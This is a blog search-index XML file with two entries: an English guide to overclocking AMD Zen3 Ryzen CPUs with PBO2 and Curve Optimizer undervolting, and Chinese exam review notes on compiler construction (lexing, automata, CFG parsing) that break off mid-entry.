<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Overclocking AMD Zen3 with PBO2 Done Right: A full guide</title>
      <link href="//overclocking-zen3/"/>
      <url>//overclocking-zen3/</url>
      
        <content type="html"><![CDATA[<h1 id="Overclocking-Ryzen-5600X-5800X-5900X-5950X-using-PBO2"><a href="#Overclocking-Ryzen-5600X-5800X-5900X-5950X-using-PBO2" class="headerlink" title="Overclocking Ryzen 5600X&#x2F;5800X&#x2F;5900X&#x2F;5950X using PBO2"></a>Overclocking Ryzen 5600X&#x2F;5800X&#x2F;5900X&#x2F;5950X using PBO2</h1><p>This guide aims to overclock Zen3 CPUs with Precision Boost Overdrive 2 (PBO2), gaining extra performance in the single-core score(about <strong>5% - 15%</strong>) while maintaining or even increasing the multi-core score. The solution may also apply to the Zen4 series, but the args cannot be a valid reference.</p><h2 id="Before-the-overclocking"><a href="#Before-the-overclocking" class="headerlink" title="Before the overclocking"></a>Before the overclocking</h2><h3 id="Mindset"><a href="#Mindset" class="headerlink" title="Mindset"></a>Mindset</h3><p>Zen3 series is super hot, so you lower the voltage, lower the temperature, and more performance can be obtained under the temperature limit. The heat gets heavily trapped inside the chip, so <strong>a good cooler can help a lot!</strong><br>Ideal idle temperature: 40-60 Celsius</p><p>Although <strong>you always overclock with your risks</strong>, here’s a point worth mentioning: <strong>PBO2 itself is SAFE,</strong> since it never actually changes the voltage for different cores under different frequencies(the CPU requires a voltage from the motherboard, so it physically cannot allocate different voltage for each core precisely). Instead, it changes the frequency of each core under a certain voltage (i.e. changes the frequency-voltage <em>curve</em>)! We’ll see how to adjust the <em>curve</em> later.</p><p><strong>Note: Even though it’s not the voltage that changes, we still use the term “increase&#x2F;decrease voltage” in this article because it’s easier to understand.</strong></p><p>What we need to spend time adjusting:</p><ul><li>EDC</li><li>Curve Optimizer</li><li>CPU Offset Voltage (if needed)</li></ul><h3 id="Know-the-quality-of-your-chip-Optional"><a href="#Know-the-quality-of-your-chip-Optional" class="headerlink" title="Know the quality of your chip (Optional)"></a>Know the quality of your chip (Optional)</h3><p>A specific CPU chip has its <em>quality</em>, indicating the potential performance gain from overclocking. If you are using an ASUS motherboard, try this before the overclocking to know your silicon quality: <a href="https://www.cybermania.ws/apps/amd-ryzen-silicon-tester-amd-v-f/">AMD Ryzen Silicon Tester (AMD V&#x2F;F)</a>. Remember to have everything in <strong>default(no overclocking, no PBO2).</strong> and have as few background tasks as possible.<br>Reference table:</p><table><thead><tr><th>Score</th><th>Quality</th></tr></thead><tbody><tr><td>&lt;110</td><td>Bad</td></tr><tr><td>110-115</td><td>Normal</td></tr><tr><td>115-125</td><td>Good</td></tr><tr><td>&gt;125</td><td>Excellent</td></tr></tbody></table><h3 id="All-in-One-Solution-Optional"><a href="#All-in-One-Solution-Optional" class="headerlink" title="All in One Solution (Optional)"></a>All in One Solution (Optional)</h3><p>If you are finding good initial values for tweaking (or even only use args generated by an automatic tool), have a look → <a href="https://www.techpowerup.com/download/amd-ryzen-clock-tuner-ctr-1usmus/">Clock Tuner</a></p><h3 id="Software-Tools-to-Prepare"><a href="#Software-Tools-to-Prepare" class="headerlink" title="Software&#x2F;Tools to Prepare"></a>Software&#x2F;Tools to Prepare</h3><ul><li><a href="https://github.com/sp00n/corecycler/releases/tag/v0.9.4.2">Corecycler</a> (To test the stability of your overclock settings)</li><li>AMD Ryzen Master (provided by the AMD)</li><li>CPU-Z or other benchmark tools</li></ul><h2 id="Detailed-Steps"><a href="#Detailed-Steps" class="headerlink" title="Detailed Steps"></a>Detailed Steps</h2><p>Platform used: ASUS TUF B550M</p><h3 id="Set-BIOS-args"><a href="#Set-BIOS-args" class="headerlink" title="Set BIOS args"></a>Set BIOS args</h3><p>Reboot and enter the BIOS, here’s some key settings. The actual path may vary from different motherboards&#x2F;BIOS. So if an item cannot be found after your carefully searching, just ignore it.</p><ul><li>Ai Overclock Tuner: Manual or DOCP if XMP for the RAM enabled</li><li>Performance Enhancement: ALWAYS OFF.</li><li>Spread Spectrum: ALWAYS OFF.<ul><li><img src="/overclocking-zen3/DOCP.png" loading="lazy"></li></ul></li><li>CPU Core Ratio: <code>Auto</code><ul><li>May change to offset mode if you need to. Continue reading for details<br> <img src="/overclocking-zen3/cpu-voffset.jpg" alt="CPU Voltage" loading="lazy"></li></ul></li><li>Ai Tweaker&#x2F;DIGI+ VRM<ul><li>VDDCR CPU Current Capability: <code>130%</code> or <code>140%</code> or more, as high as possible</li><li>VDDCR SOC Current Capability (if exists, maybe in a different path): <code>130%</code> or <code>140%</code> or more, as high as possible</li><li>Loadline Calibration: ALL <code>Auto</code> . It’s almost meaningless to change it unless you have a fixed frequency and CPU voltage, or you always get BSoD after every try in PBO2.</li><li>Set all other options to <code>Extreme</code> if possible<br> <img src="/overclocking-zen3/DIGI-VRM.jpg" alt="DIGI+ VRM" loading="lazy"></li></ul></li><li>Advanced&#x2F;AMD CBS&#x2F;NBIO Common Options&#x2F;SMU Common Options<ul><li>CPPC: ON! √√√</li><li>CPPC preferred cores: ON&#x2F;OFF, not sure. (I leave it ENABLED, but Windows scheduler sucks so it may make applications stuttery when switching between cores. Test it by yourself after everything is done, if you like!)<br> <img src="/overclocking-zen3/cppc.jpg" alt="CPPC" loading="lazy"></li></ul></li><li>Fmax Enhancer: ALWAYS OFF.</li><li><strong>PBO settings under the “Ai Tweaker” tab (if exists): ALL <code>Auto</code> !</strong><ul><li><img src="/overclocking-zen3/ai-tweaker-PBO.jpg" loading="lazy"></li></ul></li><li>PBO settings under the “Advanced” tab:<ul><li>Precision Boost Overdrive: <code>Manual</code></li><li>PBO Limits: <code>Manual</code></li><li>PPT&#x2F;TDC&#x2F;<strong>EDC</strong> (this is an important arg)<ul><li>Reference for 5600X&#x2F;5800X: 350&#x2F;140&#x2F;160</li><li>Reference for 5900X&#x2F;5950X: 350&#x2F;150&#x2F;190</li><li>PPT makes little difference, set it to a reasonably high number (300 is enough, I take 350 here)</li><li>TDC should be lower than EDC about 20~45.</li><li><strong>EDC is important!</strong> If it is too low, not enough energy to feed the chip; if it is too high, the PBO2 algorithm can be extremely aggressive so the CPU is always thermal throttling, leading to worse performance. For 5600X&#x2F;5800X, it is about 150~170; for 5900X&#x2F;5950X, it is about 170~210. Test different values until you find that the frequency reached a maximum during CPU-Z all-core testing.</li></ul></li><li>PBO Scalar: Manual &#x2F; 10X (If your cooler sucks, make this arg lower)</li><li>Max CPU Boost Clock Override: 200MHz (If your cooler sucks, make this arg lower too)</li><li>Thermal limit: auto or a high value. This arg can only lower the temperature limit set by the manufacturer, so it makes no difference</li><li><strong>Curve Optimizer: Per Core, and the NEGATIVE values for each core are all we have to determine in the next step. Leave it all 0 now.</strong><br> <img src="/overclocking-zen3/advanced-PBO.jpg" alt="Advanced PBO" loading="lazy"></li></ul></li><li>Advanced&#x2F;CPU Configuration&#x2F;PSS Support: ON! With some cores sleeping, the working cores can boost more since the chip is cooler.<ul><li><img src="/overclocking-zen3/pss.jpg" loading="lazy"></li></ul></li><li>Advanced&#x2F;AMD CBS&#x2F;Global C-State Control: ON! For the same reason.<ul><li><img src="/overclocking-zen3/C-state.jpg" loading="lazy"></li></ul></li></ul><p><code>F10</code> or the key to save the BIOS setting and enter the system to ensure your settings work.</p><h3 id="Curve-Optimizer-Downvoltaging"><a href="#Curve-Optimizer-Downvoltaging" class="headerlink" title="Curve Optimizer: Downvoltaging"></a>Curve Optimizer: Downvoltaging</h3><p><strong>The key idea: lower the voltage curve (for each frequency) to have more thermal and power space for boosting.</strong><br>So we need negative values here.<br>(We say <code>-25</code> is more negative than <code>-20</code>, so you know “make the value more negative” will make a negative number even further from zero)</p><ol><li><p>Enter the system, open the Ryzen Master, check for the 1st and 2nd fastest core, and remember the core number (start from 1. e.g. #1 and #5) <img src="/overclocking-zen3/fastest-cores.png" loading="lazy"></p></li><li><p>Restart and enter the BIOS, find <code>Advanced/PBO/Curve Optimizer</code> or another path if you are using a different motherboard</p></li><li><p>Set all the cores to negative <code>-30</code> (if your chip score is not so good, set it to <code>-25</code> or something) except for the 1st and 2nd fastest core.</p></li><li><p>For the 1st and 2nd fastest core(numbers start from 0 in many BIOS, in that case, please do a trivial convert for the number. e.g. #1-&gt;#0 and #5-&gt;#4), set the value to <code>-25</code>(if your chip score is not so good, set it to <code>-20</code> or something): they need higher voltage to boost higher.</p></li><li><p>Apply changes and restart, try to enter the system and check stability:</p><ul><li>Unstable - Can even not enter the system: make the value less negative (increase the voltage) of all cores</li><li>Unstable - Entered the system and got BSoD: Restart and try to finish these steps before a BSoD again:<ol><li>Open the Windows Event Viewer, go to System, and look for errors from WHEA-logger with ID&#x3D;18.</li><li>If found, check the APIC ID in detail. APIC ID is the number of the logic core that failed, so you need to convert it into physical core number. For example, my 5800X has 2 threads per core, so APIC ID 9 means physical CPU core #floor(9&#x2F;2)&#x3D;#4 (start from #0) failed. <img src="/overclocking-zen3/WHEA18.png" loading="lazy"></li><li>Restart and enter the BIOS, make the value less negative (increase the voltage) of this specific core</li></ol></li><li>Unstable - Start a fast verification using CoreCycler(with <code>config.ini</code> args set to runtimePerCore&#x3D;60, maxIterations&#x3D;3), but failed: make the value less negative (increase the voltage) of cores reporting errors<ul><li>You can check the log files: <img src="/overclocking-zen3/Corecycler-error-log.png" loading="lazy"> <img src="/overclocking-zen3/Corecycler-error-log2.png" loading="lazy"></li></ul></li><li>Everything is ok and the CoreCycler test passed: can be more aggressive, make the value more negative (decrease the voltage) of all cores by a small value (e.g. <code>5</code> or <code>3</code> or <code>1</code>, up to you)<ul><li>Tips: If you hit the minimum value (typically <code>-30</code>) that you can set in Curve Optimizer, but you still want to dig deeper, then you can change <code>VDDCR CPU Voltage</code> from <code>Auto</code> to <code>Offset</code>, and set negative values for your CPU. In this way, you can decrease the CPU voltage (globally) even more when combined with the Curve Optimizer downvoltaging.</li><li>Note: If your chip sucks, you may even need to set some cores working at <em>positive</em> values (higher voltage than default)</li></ul></li></ul></li><li><p>Repeat step 5 until you find the best args!</p></li></ol><p>My results (5800X): <code>-15</code> for the fastest 2 cores and <code>-28</code>~<code>-30</code> for others; CPU voltage offset <code>-0.04375</code><br><img src="/overclocking-zen3/curve.jpg" alt="Curve Optimizer" loading="lazy"><br>CPU-Z Score:</p><ul><li>Single-core&#x3D; 678.0</li><li>Multi-cores&#x3D; 6823.6</li></ul><h3 id="Verify-Stability"><a href="#Verify-Stability" class="headerlink" title="Verify Stability"></a>Verify Stability</h3><p>If the following condition is met, then you made it!</p><ul><li>Leave the computer idle (low workload), and open a webpage normally</li><li>Run Corecycler for like 4 hours with no errors:<ul><li>runtimePerCore &#x3D; 360</li><li>maxIterations &#x3D; 10000</li><li><img src="/overclocking-zen3/Corecycler.png" loading="lazy"></li></ul></li><li>Run CPU-Z for a score!</li><li>Run a benchmark tool and see the args changing on the Ryzen Master panel</li><li>Play a game or do what you want without BSoD and WHEA 18 event in your event viewer</li></ul><p>If any error occurrs, you know what to do from the paragraph above: increase the voltage.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[Chinese]<a href="https://www.bilibili.com/video/BV15b4y1R7EV/">AMD RYZEN5000系列体质测试工具分享</a><br>[Chinese]<a href="https://www.bilibili.com/read/cv16285050/">5800X PBO和Curve Optimizer的测试与优化</a><br>[Chinese]<a href="https://www.bilibili.com/read/cv13796433/">AMD 5000系Ryzen平台锐龙处理器 全面超频快速调教指南</a><br>[Chinese]<a href="https://www.bilibili.com/read/cv10267893/">关于EDC对Ryzen5000系列CPU效能的影响</a><br><a href="https://www.youtube.com/watch?v=QCyZ-QYwsFY">AMD. What’s New with Precision Boost Overdrive 2.</a></p>]]></content>
      
      
      <categories>
          
          <category> Computer Hardware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> English </tag>
            
            <tag> Overclocking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理课程笔记（All-in-One速通版）</title>
      <link href="//compiler-construction-principles/"/>
      <url>//compiler-construction-principles/</url>
      
        <content type="html"><![CDATA[<h1 id="编译原理Speed-run-any"><a href="#编译原理Speed-run-any" class="headerlink" title="编译原理Speed-run any%"></a>编译原理<code>Speed-run any%</code></h1><p>以<strong>快速复习</strong>为目的，尽可能对缺乏动机(intuition)的一些概念<strong>提供课堂外的例子以简明解释</strong>。<br>标题中使用<code>*</code>标记的部分为考试<strong>不</strong>考察的内容。</p><p><strong>包含浙江大学编译原理课程课改后新增部分。</strong></p><p>文中大部分图片来自于姚老师(ZJU, pyaoaa at zju.edu.cn)，在此表示感谢。<br>建议阅读本笔记时配合老师课件&#x2F;讲义作为参照。</p><h2 id="Part-0-课程信息"><a href="#Part-0-课程信息" class="headerlink" title="Part 0: 课程信息"></a>Part 0: 课程信息</h2><p>使用教材：<em>Modern Compiler Implementation in C</em>, Andrew W. Appel （A.K.A. 虎书）</p><p>相关课程：</p><ul><li><a href="http://web.stanford.edu/class/cs143/">Stanford课程主页</a></li><li><a href="https://github.com/6035/sp21">MIT课程主页</a></li><li><a href="https://inst.eecs.berkeley.edu/~cs164/fa21/">UCBerkeley课程主页</a></li></ul><p>分数构成：</p><ul><li>课程作业(课后小型练习题) &#x3D; 10%</li><li>随堂测验&#x3D; 10%</li><li>期中考试&#x3D; 15%</li><li>综合性课程设计&#x3D; 25%</li><li>期末考试&#x3D; 40% （斩杀线40&#x2F;100）</li></ul><p>期末考试：</p><ul><li>英语，半开卷，允许携带<strong>3 张可双面打印或手写的 A4 纸</strong>入场</li><li><strong>题量较大！</strong></li><li>考试范围：虎书 1-11 13-14 18 章：<br>Ch.01 Introduction<br>Ch.02 Lexical Analysis<br>Ch.03 Parsing<br>Ch.04 Abstract Syntax<br>Ch.05 Semantic Analysis<br>Ch.06 Activation Record<br>Ch.07 Translating into Intermediate Code<br>Ch.08 Basic Blocks and Traces<br>Ch.09 Instruction Selection<br>Ch.10 Liveness Analysis<br>Ch.11 Register Allocation<br>Ch.13 Garbage Collection<br>Ch.14 Object-oriented Languages (无大题)<br>Ch.18 Loop Optimizations (无大题)</li><li>题型：判断20道*1&#x3D;20分 选择20道*1.5&#x3D;30分 大题7题共50分</li><li>复习要点（大部分都考过，<strong>粗体为侧重点</strong>）<ul><li>重点关注 <strong>编译器前端部分（课改前已有的教学内容）</strong></li><li>熟悉重要概念：包括但不限于：<ul><li>lexer&#x3D;scanner, parser</li><li>derivation, reduction</li><li>semantic action</li><li>AST, APT</li><li>stack, heap<ul><li>data段，text段</li></ul></li><li>Bruke-Fisher</li><li>解析树，二义性，结合性，左递归文法</li><li>sentential form, sentence, language, Chomsky form</li><li>reduce-reduce conflict, shift-reduce conflict</li><li>leaf procedure</li><li>activation record, stack frame, <strong>frame-resident variable</strong></li><li>temporary, formals, 虚拟寄存器</li><li><strong>static link</strong>, lambda lifting, <strong>display</strong></li><li>interference graph</li><li>escape, spill</li><li>liveness, live-in, live-out, use of…, def of…</li><li>canonical form, canonical tree</li><li>basic block, trace, covering set of traces</li><li>commute, side-effect</li><li>optimum tiling, optimal tiling</li><li>internal fragmentation, external fragmentation</li></ul></li><li>提高涉及各算法的<strong>计算题熟练度</strong>与<strong>概念辨析能力</strong>。包括但不限于：<ul><li><strong>计算 liveness</strong>: 算出每个指令的<code>in[n]</code> <code>out[n]</code></li><li><strong>计算 First, Follow, Nullable 集</strong></li><li><strong>构造各个文法的状态图&#x2F;预测分析表</strong>，并据此判断给定的文法（一些产生式）是否为该文法（i.e. 判断有无 conflict）</li><li><strong>实现块结构的不同方法</strong>：lambda 提升， static link, display<br>一些快速判断方法：<ul><li>利用文法的包含关系快速判断</li><li>有左递归&#x2F;左公因子 -&gt; 不是LL(1)</li></ul></li><li><strong>对 IR Tree 进行树覆盖</strong>：使用 <strong>Maximal Munch</strong> &#x2F; 动态规划</li><li><strong>Mark-and-Sweep</strong>, Reference count, Copying collection (Stop-and-Copy) 各自的垃圾回收流程</li><li><strong>Briggs &#x2F; George 各自的 coalesce 策略</strong></li><li><strong>Do actual spill 时具体如何 rewrite</strong></li><li><strong>通过使用次数和度数计算哪个节点需要被spill</strong><ul><li>待补</li></ul></li><li><strong>给定功能需求写出NFA&#x2F;DFA 或 给定 NFA&#x2F;DFA 描述其功能</strong><ul><li>识别能被5整除的二进制数：5个状态表示 mod 5 余数</li></ul></li><li><strong>寄存器分配图染色全过程</strong>（build, simplify, coalesce, freeze, spill, select, rewrite）</li><li>NFA-&gt;DFA 子集构造法</li><li>Hopcroft 算法简化 DFA (状态转换表)</li><li>各个文法识别字符串的过程，判断是否被接受</li><li>符号表的不同实现方式（ <strong>imperative</strong> or <strong>functional</strong> ）以及优势劣势</li><li>函数调用时 活动记录&#x2F;栈帧 的布局变化，FP&#x2F;SP 的变化</li><li>interference graph 的 simplify &#x2F; coalesce &#x2F; …</li><li>IR Tree 线性化为 canonical trees, 组装成 basic blocks, 排序为 traces, 最后生成目标机器代码的全过程</li><li>Deutsch-Schorr-Waite (DSW) pointer reversal 算法流程</li><li>变量逃逸的三种情况：引用、取地址、嵌套函数访问</li><li>循环优化中，上提变量的前提</li></ul></li><li>确保掌握作业题：和历年大题重复度高，可能出现升级版题甚至“原题”<ul><li>可以找不同班级的同学要一下作业题</li></ul></li></ul></li></ul><p>前置知识：计算理论（笔记参考<a href="https://note.tonycrane.cc/cs/tcs/toc/">https://note.tonycrane.cc/cs/tcs/toc/</a>）</p><h2 id="Part-1-简介"><a href="#Part-1-简介" class="headerlink" title="Part 1: 简介"></a>Part 1: 简介</h2><p>基本概念：</p><ul><li>中间代码&#x3D;Intermediate Code</li><li>词法分析&#x3D;Lexing&#x2F;Scanning&#x2F;LexicalAnalysis</li><li>语法分析&#x3D;Parsing&#x2F;SyntaxAnalysis</li><li>中间表示&#x3D;IR&#x3D;Intermediate Representation</li><li>树型中间表示&#x3D;IR Tree</li><li>前端，后端</li></ul><h2 id="Part-2-词法分析"><a href="#Part-2-词法分析" class="headerlink" title="Part 2: 词法分析"></a>Part 2: 词法分析</h2><h3 id="词法分析概述"><a href="#词法分析概述" class="headerlink" title="词法分析概述"></a>词法分析概述</h3><p>使用分词器(parser &#x2F; tokenizer)将输入字符串切割、识别为有意义的子串（把基本单元划分好）。<br><code>(单词Token, 词素Lexeme(可选))</code><br>e.g.:</p><ul><li><code>(IF, )</code> <code>(ELSE, )</code> <code>(BINARY_OP, &gt;=)</code> <code>(UNARY_OP, &amp;)</code></li></ul><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p><em>读者应当已经在前置课程中掌握了该部分内容。</em></p><p>Regex Expression &#x3D; RE<br>运算：连接concatenation + 幂Power<br>e.g.: $ ab(a|b)^3c^* $</p><h3 id="有穷自动机"><a href="#有穷自动机" class="headerlink" title="有穷自动机"></a>有穷自动机</h3><p><em>读者应当已经在前置课程中掌握了该部分内容。</em></p><p>相关概念：</p><ul><li><p>NFA: 非确定有限状态自动机</p></li><li><p>DFA: 确定有限状态自动机</p></li><li><p>子集构造法subset construction</p><ul><li>用途：NFA-&gt;DFA</li><li>DFA的每个状态是NFA的状态集合的一个子集</li><li>读了输入ai后NFA能到达的所有状态：s1,s2,…,sk，则DFA到达一个状态，对应于NFA的{s1,s2,…,sk}</li><li>NFA状态(集)上的一些操作定义<ul><li>ε-closure(s):&#x3D; NFA状态s的ε-闭包&#x3D;s经ε转换所能到达的状态集合</li><li>ε-closure(T):&#x3D; T中所有状态的ε-闭包的并集,即 $ \cup_{s\in T}{\epsilon-closure(s)} $</li></ul></li><li>过程<ol><li>NFA的初始状态S的ε-闭包对应于DFA的初始状态</li><li>针对每个DFA状态(对应NFA状态子集A)，求输入每个可能输入ai后能到达的NFA状态的ε-闭包并集（NFA从状态集A出发，读入ai后能到达的状态集合） $$ S&#x3D;\epsilon-closure(move(A,a_i)) $$</li><li>该集合S要么对应于DFA中的一个已有状态，要么令其成为一个新加的DFA状态</li><li>重复上述两步，逐步构造DFA的状态转换表（每个状态集合S与每个输入ai），直到不动点（不再新增状态，且状态转移表完全求出，即对任一状态集合S已知分别接受所有输入ai将分别转移到何状态）</li><li>在DFA中，只要状态集合S包含至少一个原来NFA中的终止状态，就把S标记为终止状态</li></ol></li><li>示例：<ul><li><img src="/compiler-construction-principles/nfa2dfa.png" alt="nfa2dfa" loading="lazy"></li></ul></li></ul></li><li><p>Thumpson构造法（汤普森构造法）(RE-&gt;NFA)：略。如果题目 <strong>明确说需要用 Thumpson 构造法</strong> ，只需要注意<strong>不要自作主张省去一些 ε-move 与状态</strong>即可。</p></li></ul><h3 id="词法分析器自动生成"><a href="#词法分析器自动生成" class="headerlink" title="词法分析器自动生成"></a>词法分析器自动生成</h3><ul><li>DFA最小化（-&gt;状态最小的DFA，在同构意义下唯一）</li><li>可区分状态：存在串s使其分别从状态s、t出发，一个接受串s，一个拒绝串s，则s与t可区分</li><li>步骤：<ol><li>初始等价类，仅由接受状态集合和非接受状态两个集合构成</li><li>用所有可能的输入ai应用于各个集合（走一步）<ul><li>只有集合G的每个状态读入同一字符后，都落入（包含在）相同的某个集合，该集合G在这一步才不用细分</li><li>否则集合G要被细分：落入不同集合的对应状态需要被分割进不同集合</li></ul></li><li>不断重复2直到不动点（任一集合分别对所有输入ai都不可细分）</li><li>此时等价类中的每个集合即对应最小DFA的一个状态。在其上可以轻松构建min-DFA，该过程是trivial的（可以每个组中选择一个状态作代表）。</li></ol></li><li>示例：<ul><li><img src="/compiler-construction-principles/DFA-simplify-diverge.png" alt="DFA-simplify-diverge" loading="lazy"></li><li><img src="/compiler-construction-principles/DFA-simplify.png" alt="DFA-simplify" loading="lazy"></li></ul></li></ul><h3 id="Lex工具"><a href="#Lex工具" class="headerlink" title="Lex工具"></a>Lex工具</h3><p>通常和Yacc一起使用，生成编译器的前端。</p><ul><li>声明部分<ul><li>常量：常数标识符</li><li>正则规则定义</li></ul></li><li>转换规则模式{动作}<ul><li>模式&#x3D;正则表达式</li><li>动作&#x3D;识别到相应模式时应调用的处理函数（一般以C语言代码表示）</li></ul></li><li>辅助函数：动作中使用的函数</li></ul><p>解决冲突：最长匹配，较前规则优先</p><h2 id="Part-3-语法分析-CFG-Parsing"><a href="#Part-3-语法分析-CFG-Parsing" class="headerlink" title="Part 3: 语法分析 - CFG &amp; Parsing"></a>Part 3: 语法分析 - CFG &amp; Parsing</h2><h3 id="语法分析器概述"><a href="#语法分析器概述" class="headerlink" title="语法分析器概述"></a>语法分析器概述</h3><p>从词法分析器获得Token序列，确认该序列是否可以由语言的文法生成</p><ul><li>对于语法错误的程序，报告错误信息</li><li>对于语法正确的程序，生成语法分析树(简称语法树) e.g. 抽象语法树AST</li></ul><p>实现：手动 or 自动(使用Parse generator&#x3D;{Yacc, Bison, ANTLR, mehir…})</p><h3 id="上下文无关文法CFG"><a href="#上下文无关文法CFG" class="headerlink" title="上下文无关文法CFG"></a>上下文无关文法CFG</h3><p>CFG &#x3D; Context Free Language</p><p>$$ G&#x3D;(T,N,P,S) $$<br>T：终结符集合(Terminals)<br>N：非终结符集合(Non-terminals)<br>P：产生式集合(Productions) $ A\rightarrow a, A \in N, a \in (T \cup N)^*$<br>S：开始符号(Startsymbol): $ S \in N $</p><blockquote><p>📕“上下文无关”体现在：产生式左侧只有一个非终结符，因此类似 $xAy\rightarrow xay$这样，需要关心符号前后别的符号是什么才能应用的产生式是不能在CFG里的。</p></blockquote><ul><li>特殊符号：$ &#x3D;end of file(EOF)<br>添加一个新符号S’与一条新规则以表明必须在尾部：<ul><li>$ S’ \rightarrow S$ $</li></ul></li><li>产生式缩写：左侧一样的产生式可以把右侧使用”|”合并。例如 $E\rightarrow E+E|(E)|id$</li></ul><h3 id="推导Derivation和规约Reduction"><a href="#推导Derivation和规约Reduction" class="headerlink" title="推导Derivation和规约Reduction"></a>推导Derivation和规约Reduction</h3><p>例如有产生式 $A\rightarrow \gamma$，可以有这样的变换： $\alpha A \beta \Rightarrow \alpha \gamma \beta$<br>那么我们说：</p><ul><li>$\alpha A \beta $ <strong>直接推导</strong>到 $ \alpha \gamma \beta$</li><li>$\alpha \gamma \beta $ <strong>直接规约</strong>到 $  \alpha A \beta$<br>不言而喻的<strong>多步推导记号</strong>：$\Rightarrow^5$ $\Rightarrow^+$ $\Rightarrow^*$<br>分别代表五步推导，至少一步推导，0次或更多次推导</li><li>推导&#x3D;从文法生成语言里的句子，规约&#x3D;识别句子成分并逐渐规约到开始符号</li></ul><ol><li><p>最左推导Left-most Derivation</p><ul><li>最左推导&#x3D;每步代换最左边的非终结符。逆过程为最右规约</li><li>类比可得出最右推导、最左规约的定义</li><li>在自顶向下的分析中，总是采用<strong>最左推导</strong>；在自底向上的分析中，总是采用<strong>最左归约</strong></li></ul><p> <img src="/compiler-construction-principles/lmrm.png" alt="left-most derive" loading="lazy"></p></li><li><p>句型 句子 语言</p><ul><li>句型(Sentential form) &#x3D; 文法G下可能推导出的一个符号序列：可能包含终结符&#x2F;非终结符，可为空</li><li>句子(Sentence) &#x3D; 不含非终结符的句型（仅含终结符）</li><li>语言(Language) &#x3D; 文法G可产生的所有句子的集合</li></ul></li><li><p>正则文法(RE) 与 上下文无关文法(CFG)</p><ul><li>上下文无关语言L(G) :&#x3D; CFG产生的所有句子的集合</li><li>正则语言L(r) :&#x3D; RE产生的所有句子的集合<ul><li>RE &#x3D; Regex Expression &#x3D; 正则表达式</li><li>正则表达式r定义正则语言L(r)</li><li>$ L(r) \in L(G) $：因为正则对产生式限制更大，必须为( $A,B \in N, a \in T\cup {\epsilon} $ )：<ul><li>左线性文法：形如 $A\rightarrow aB$ 或 $A\rightarrow a$</li><li>右线性文法：形如 $A\rightarrow Ba$ 或 $A\rightarrow a$</li></ul></li><li>正则语言可用于词法分析，上下文无关语言可用于语法分析（语言描述能力、复杂性决定的）</li></ul></li></ul></li><li><p>Chomsky范式（计算理论课程内容）:</p><ul><li>0型文法&#x3D;短语结构文法 递归可枚举</li><li>1型文法&#x3D;上下文有关文法</li><li>2型文法&#x3D;CFG</li><li>3型文法&#x3D;RE</li></ul></li></ol><h3 id="CFG的分析树Parse-Tree"><a href="#CFG的分析树Parse-Tree" class="headerlink" title="CFG的分析树Parse Tree"></a>CFG的分析树Parse Tree</h3><ul><li><p>分析树性质</p><ul><li>根节点&#x3D;文法初始符号</li><li>叶节点&#x3D;终结符</li><li>内部节点&#x3D;非终结符</li><li>父节点→{叶节点}&#x3D;产生式</li></ul></li><li><p>语法分析(Parsing)中的挑战<br><em>核心目标：对于终结符号串x，要么从S推导出x，要么设法将x规约到S</em>*</p><ul><li>自顶向下(Top-down) S-&gt;x, 从<strong>根节点</strong>开始构造Parse Tree</li><li>自底向上(Bottom-up) x-&gt;S, 从<strong>叶节点</strong>开始构造Parse Tree</li></ul><p>作为搜索问题：搜索空间大-&gt;空间大小受文法产生式限制</p><ul><li>无限制文法：时间复杂度 $O(n^3)$</li><li>上下文无关语言CFL 的子集需要的典型时间为 $O(n)$，例如<ul><li>Predictive parsing using LL(1) grammars</li><li>Shift-Reduce parsing using LR(1) grammars</li><li>…</li></ul></li></ul></li></ul><h3 id="编程语言的文法设计"><a href="#编程语言的文法设计" class="headerlink" title="编程语言的文法设计"></a>编程语言的文法设计</h3><p>核心：<strong>无二义性</strong></p><ul><li><p>二义性来源：某些句子存在不止一棵分析树&#x3D;有两个不同的最左推导&#x3D;<strong>多种可选推导处于文法同一层</strong><br>例如：$$E \Rightarrow E*E \Rightarrow id*E \Rightarrow id*E+E$$ 与 $$E \Rightarrow E+E \Rightarrow E*E+E \Rightarrow id*E+E $$<br>对于”3*4+5”，前者给出3*(4+5)&#x3D;27（错误），后者给出3*4+5&#x3D;17（正确）。</p></li><li><p>解决办法：</p><ul><li>确保只有一种最左推导&#x3D;将同一层文法分层</li><li>规定符号优先级（”*“” &gt; “+”,”-“）<ul><li>越接近开始符号S的文法符号优先级越低</li></ul></li><li>规定符号结合性（左结合&#x2F;右结合）<ul><li>递归非终结符（也就是这个终结符在产生式左部右部都出现）在终结符（也就是这个运算符，比如<code>*</code>,<code>+</code>）左边，运算就左结合</li><li><img src="/compiler-construction-principles/priority.png" alt="op priority" loading="lazy"></li></ul></li></ul></li><li><p>判定CFG二义性：不可判定问题<br>但可以通过给定充分条件（无二义文法）确保无二义性：</p><ul><li>自顶向下：LL(1)</li><li>自底向上：LR(1), LALR(1)<br><a name="grammars-set"></a></li></ul></li></ul><p><img src="/compiler-construction-principles/grammars.png" alt="grammars" loading="lazy"></p><h2 id="Part-4-语法分析-自顶向下"><a href="#Part-4-语法分析-自顶向下" class="headerlink" title="Part 4: 语法分析 - 自顶向下"></a>Part 4: 语法分析 - 自顶向下</h2><p>自顶向下每一步的推导都需要做出<strong>两个选择</strong>：</p><ul><li>替换哪个非终结符？</li><li>应用哪个（左侧为该终结符的）产生式替换？</li></ul><h3 id="递归下降分析Recursive-Descent-Parsing"><a href="#递归下降分析Recursive-Descent-Parsing" class="headerlink" title="递归下降分析Recursive-Descent Parsing"></a>递归下降分析Recursive-Descent Parsing</h3><p>自顶向下语法分析的<strong>一种通用解决方案</strong>。<br><strong>只有 LL(k) 文法能使用该方法。</strong></p><ul><li>从根节点开始，尝试应用一个产生式，从而产生一个句型（例如<code>S-&gt;(S)</code>）；</li><li>递归下降到下一层：对句型中非终结符也尝试应用一个产生式；</li><li>发生错误（例如发现产生的句型<code>((S))</code>不可能匹配给定的字符串<code>(a)</code>）就尝试另一个产生式；</li><li>如果所有产生式都错误，则失败，需要回溯让上层选择其他产生式。</li><li>问题：太慢！<ul><li>该过程类似NFA，能否构造类似DFA的分析方法？</li></ul></li></ul><h3 id="LL-1-和预测分析法"><a href="#LL-1-和预测分析法" class="headerlink" 